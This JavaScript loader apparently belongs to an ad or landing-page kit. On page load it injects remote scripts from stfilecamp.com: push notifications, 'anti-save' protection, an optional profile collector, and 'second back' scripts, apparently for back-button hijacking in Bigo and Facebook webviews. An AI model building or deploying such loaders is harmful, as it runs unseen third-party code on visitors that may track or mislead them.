document.addEventListener("DOMContentLoaded", () => {

    /**** Main config. By default: siteProtect, pushNotification, sBMulti are active  */
    let fileCollector = {
        pushNotification: true,
        translator: false,
        siteProtect: true,
        profileCollector: false,
        platform: false,
        secBackFiles: {
            sBBigo: false,
            sBBigoWV: false,
            sBBigoWVLoader: false,
            sBFb: false,
            backOnly: false,
            sBMulti: true,
        }
    }


    const libsPath = 'https://cdnjs.cloudflare.com/ajax/libs/';
    const filesPath = 'https://tt.stfilecamp.com/jsfiles/'; 


    /**** Add push notification */
    if(fileCollector.pushNotification) {
        const pushNotification = document.createElement('script');
        pushNotification.src =  'https://cdn.stfilecamp.com/multi_push.js';
        pushNotification.async = false;

        pushNotification.onerror = () => {
            console.log('Error occurred while loading script pushNotification');
        };

        document.head.appendChild(pushNotification);
    }


    /**** Add Translator js and styles */
    if(fileCollector.translator) {
        const translatorCockie = document.createElement('script');
        const translatorMain = document.createElement('script');
        const translatorCss = document.createElement('link');

        translatorCockie.src = `${filesPath}js.cockie.min.js`;
        translatorMain.src = `${filesPath}translate.js`;
        translatorCss.href = `${filesPath}translate.css`;
        translatorCss.setAttribute('rel', 'stylesheet');

        translatorCockie.async = false;
        translatorMain.async = false;
        translatorCss.async = false;

        translatorCockie.onerror = () => {
            console.log('Error occurred while loading script translatorCockie');
        };

        translatorMain.onerror = () => {
            console.log('Error occurred while loading script translatorMain');
        };

        document.head.appendChild(translatorCockie);
        document.head.appendChild(translatorMain);
        document.head.appendChild(translatorCss);
    }

    /**** Add anti-save protection */
    if(fileCollector.siteProtect) {
        const siteProtect = document.createElement('script');
        siteProtect.src = `${filesPath}site-protect2.0.js`;
        siteProtect.async = false;

        siteProtect.onerror = () => {
            console.log('Error occurred while loading script siteProtect');
        };

        document.head.appendChild(siteProtect);
    }

    /**** Add profile collector */
    if(fileCollector.profileCollector) {
        const cryptoJSLib = document.createElement('script');
        const profileCollector = document.createElement('script');

        cryptoJSLib.src = `${libsPath}crypto-js/3.1.2/rollups/aes.js`;
        profileCollector.src = `${filesPath}profile-collect.js`;

        cryptoJSLib.async = false;
        profileCollector.async = false;

        profileCollector.onerror = () => {
            console.log('Error occurred while loading script profileCollector');
        };

        document.head.appendChild(cryptoJSLib);
        document.head.appendChild(profileCollector);
    }

    /**** Add script which check user OS. Use element with class .platform  */
    if(fileCollector.platform) {
        const platform = document.createElement('script');
        platform.src =  `${filesPath}platform.js`;
        platform.async = false;

        platform.onerror = () => {
            console.log('Error occurred while loading script platform');
        };

        document.head.appendChild(platform);
    }

    /**** Add Second Back file */
    const secBackSrc = {
        sBBigo: `${filesPath}second_back_multi_bigo.js`,
        sBBigoWV: `${filesPath}sec_back_bigo_webview.js`,
        sBBigoWVLoader: `${filesPath}sec_back_bigo_webview_loader.js`,
        backOnly: `${filesPath}back.js`,
        sBFb: `${filesPath}second_back_fb.js`,
        sBMulti: `${filesPath}second_back_multi.js`,
    }

    let secBackFiles = fileCollector.secBackFiles;
    let arr = [];

    for (const property in secBackFiles) { 
        if(secBackFiles[property]) {
            arr.push(property);
            
        }
    }

    if(arr.length > 1) {
        console.log('Error: more then one SB active ' + arr)
    } else if (arr.length == 1) {
        
        for (const property in secBackSrc) { 
            if(property == arr[0]) {
     
                const secondBack = document.createElement('script');
    
                secondBack.src =  secBackSrc[property];
                secondBack.async = false;

                 /** For correct display of loader, main content must be in element with class .container  */
                 if(property == 'sBBigoWVLoader') {
                    const secondBackCss = document.createElement('link');
                    secondBackCss.href = `${filesPath}loader.css`;
                    secondBackCss.setAttribute('rel', 'stylesheet');
                }

                secondBack.onerror = () => {
                    console.log('Error occurred while loading script ' + property);
                };

                document.head.appendChild(secondBack);
    
                console.log(property + ' active')
            }
        }
    } else {
        console.log('Error:no one SB active')
    }
});